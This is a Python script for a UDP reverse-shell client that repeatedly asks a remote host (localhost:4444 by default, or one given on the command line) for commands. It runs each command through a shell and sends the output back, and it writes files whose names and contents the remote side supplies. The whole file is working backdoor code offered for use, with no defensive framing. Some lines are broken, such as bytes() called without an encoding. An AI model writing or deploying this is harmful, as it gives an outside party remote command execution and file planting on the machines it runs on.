import socket
import subprocess
import sys


def get_command(request, sock, host, port):
    print("[-] Requesting command...")
    sock.sendto(request, (host, port))
    return sock.recv(1024).decode()


DEFAULT_HOST = 'localhost'
DEFAULT_PORT = 4444

REMOTE_HOST = DEFAULT_HOST
REMOTE_PORT = DEFAULT_PORT

if len(sys.argv) > 1:
    REMOTE_HOST = sys.argv[1]

if len(sys.argv) > 2:
    REMOTE_PORT = int(sys.argv[2])

s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

try:
    MAKE_REQUEST = bytes('request')
    FILENAME_REQUEST = bytes('name')
    FILE_REQUEST = bytes('name')

    while True:
        command = get_command(MAKE_REQUEST, s, REMOTE_HOST, REMOTE_PORT)

        if command == 'file':
            file_name = get_command(FILENAME_REQUEST, s, REMOTE_HOST, REMOTE_PORT)
            f = None
            try:
                f = open(file_name, 'w')
                f.write(get_command(FILE_REQUEST, s, REMOTE_HOST, REMOTE_PORT))
            finally:
                f.close()
        else:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            print("[-] Sending response...")
            s.send(output + output_error)

except ConnectionAbortedError:
    print("Connection severed")
except ConnectionResetError:
    print("Connection reset")
finally:
    s.close()
